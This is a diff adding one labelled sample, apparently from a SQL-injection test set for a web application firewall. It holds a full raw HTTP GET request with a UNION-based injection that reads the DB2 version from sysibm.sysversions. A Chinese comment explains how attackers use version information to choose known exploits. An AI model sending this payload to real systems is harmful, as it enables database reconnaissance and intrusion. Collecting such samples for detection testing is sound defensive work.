@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_普通注入-06506470
+# 基于UNION查询，该SQL注入语句利用UNION注入方式，将查询结果与原始查询进行连接，以获取数据库版本号。该sql注入语句攻击的目的是通过获取数据库版本号，攻击者可以了解到已安装的数据库及版本，从而确定是否存在已知漏洞。这可以帮助他们选择适当的攻击方法和工具，以便进一步攻击和获取敏感信息。
+GET /?id=1%20union%20select%20versionnumber%20from%20sysibm.sysversions&bid=hd_tag_m8mv26lm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26lm
+RM-PRO-Token: d5d34fa5554e1f89fefe4802fcca430d
+RM-PRO-Time: 1742808632999
+User-Agent: curl/7.83.1
+
